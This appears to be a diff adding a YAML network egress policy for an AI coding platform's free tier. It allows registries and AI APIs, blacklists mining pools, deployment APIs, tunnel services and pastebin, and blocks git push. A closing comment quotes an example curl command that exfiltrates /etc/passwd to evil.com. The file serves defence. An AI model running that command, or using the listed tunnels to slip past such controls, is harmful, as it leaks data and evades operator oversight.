@@ -1,0 +1,158 @@
+# Hotel California Rules — ellul.ai Free Tier
+#
+# Core principle: code comes in, can't leave.
+# GET allowed, git clone/pull allowed, git push blocked, all other POST blocked.
+
+# Platform domains — all methods allowed
+platform_domains:
+  - "ellul.ai"
+  - "*.ellul.ai"
+  - "ellul.app"
+  - "*.ellul.app"
+
+  # AI services — needed for chat, model discovery, and CLI auth
+  - "opencode.ai"
+  - "*.opencode.ai"
+  - "api.anthropic.com"
+  - "claude.ai"
+  - "*.claude.ai"
+  - "platform.claude.com"
+  - "api.openai.com"
+  - "platform.openai.com"
+  - "*.openai.com"
+  - "generativelanguage.googleapis.com"
+  - "aistudio.google.com"
+  - "accounts.google.com"
+  - "oauth2.googleapis.com"
+
+  # Package registries — needed for npm install, pip install, apt
+  - "registry.npmjs.org"
+  - "*.npmjs.org"
+  - "pypi.org"
+  - "*.pythonhosted.org"
+
+  # GitHub — needed for git clone, binary downloads, releases
+  - "github.com"
+  - "*.github.com"
+  - "api.github.com"
+  - "raw.githubusercontent.com"
+  - "*.githubusercontent.com"
+  - "objects.githubusercontent.com"
+
+  # CDN/infrastructure — needed for package downloads
+  - "*.cloudsmith.io"
+  - "dl.google.com"
+  - "*.debian.org"
+  - "*.ubuntu.com"
+
+# Blacklisted domains — blocked even for GET
+blacklisted_domains:
+  # === Crypto mining pools ===
+  - "pool.minergate.com"
+  - "xmr.pool.minergate.com"
+  - "moneroocean.stream"
+  - "*.coinhive.com"
+  - "*.cryptoloot.pro"
+  - "*.minero.cc"
+  - "*.webminepool.com"
+  - "*.nanopool.org"
+  - "*.2miners.com"
+  - "*.herominers.com"
+  - "*.hashvault.pro"
+  - "*.supportxmr.com"
+  - "*.unmineable.com"
+  - "*.nicehash.com"
+  - "*.ethermine.org"
+  - "*.flexpool.io"
+  - "*.f2pool.com"
+  - "*.poolin.com"
+
+  # === Cloud Deployment APIs (DNS Blackhole) ===
+  # Block 1: "API Deploy" — vercel deploy, fly deploy, aws cli, etc.
+  - "api.vercel.com"
+  - "*.vercel.com"
+  - "vercel.com"
+  - "api.fly.io"
+  - "*.fly.io"
+  - "api.heroku.com"
+  - "*.heroku.com"
+  - "git.heroku.com"
+  - "api.railway.app"
+  - "*.railway.app"
+  - "api.render.com"
+  - "*.render.com"
+  - "api.netlify.com"
+  - "*.netlify.com"
+  - "api.cloudflare.com"
+  - "api.deno.com"
+  - "dash.deno.com"
+  - "*.deno.com"
+  - "api.digitalocean.com"
+  - "*.digitalocean.com"
+  - "api.linode.com"
+  - "*.linode.com"
+  - "api.vultr.com"
+  - "*.vultr.com"
+  - "api.hetzner.cloud"
+  - "*.hetzner.cloud"
+  # AWS
+  - "*.amazonaws.com"
+  - "*.awsapps.com"
+  # GCP
+  - "*.googleapis.com"
+  - "cloud.google.com"
+  # Azure
+  - "*.azure.com"
+  - "*.azurewebsites.net"
+  - "*.azurecr.io"
+  - "management.azure.com"
+  # Container registries
+  - "hub.docker.com"
+  - "*.docker.com"
+  - "*.docker.io"
+  - "ghcr.io"
+  # Serverless / edge / DBaaS
+  - "*.workers.dev"
+  - "*.pages.dev"
+  - "*.supabase.co"
+  - "*.supabase.com"
+  - "*.neon.tech"
+  - "*.planetscale.com"
+
+  # === Tunnel Services ===
+  # Block 4: "Self-Host" — ngrok, cloudflare tunnels, etc.
+  - "*.ngrok.com"
+  - "*.ngrok.io"
+  - "*.ngrok-agent.com"
+  - "equinox.io"
+  - "*.trycloudflare.com"
+  - "*.argotunnel.com"
+  - "*.localtunnel.me"
+  - "*.loca.lt"
+  - "localhost.run"
+  - "serveo.net"
+  - "bore.pub"
+  - "*.telebit.cloud"
+  - "*.tailscale.com"
+  - "*.zerotier.com"
+  - "pagekite.net"
+  - "burrow.io"
+  - "expose.dev"
+  - "*.zrok.io"
+
+  # === C2 / Paste infrastructure ===
+  - "pastebin.com"
+
+# Git push — blocked (code can't leave)
+git_blocked_content_types:
+  - "application/x-git-receive-pack-request"
+
+# Git clone/fetch/pull — allowed (code comes in)
+git_allowed_content_types:
+  - "application/x-git-upload-pack-request"
+
+# Max URL length for GET requests to external domains (bytes).
+# Prevents data exfiltration via query strings:
+#   curl 'https://evil.com/?d=$(base64 /etc/passwd)'
+# 2048 is generous for normal browsing/API use; encoded files are much longer.
+max_external_url_length: 2048
